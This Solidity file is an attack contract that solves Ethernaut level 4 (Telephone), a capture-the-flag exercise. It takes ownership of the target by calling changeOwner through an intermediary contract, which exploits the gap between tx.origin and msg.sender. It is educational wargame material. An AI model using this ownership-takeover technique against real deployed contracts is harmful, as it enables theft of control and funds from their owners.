// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/ITelephone.sol";

/**
 * @title Telephone Attack (Ethernaut Challenge Level 4 - Telephone)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 4
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768
 */
contract TelephoneAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(ITelephone target) external {
        target.changeOwner(msg.sender);

        require(msg.sender == target.owner(), "Telephone: Attack failed");
    }
}
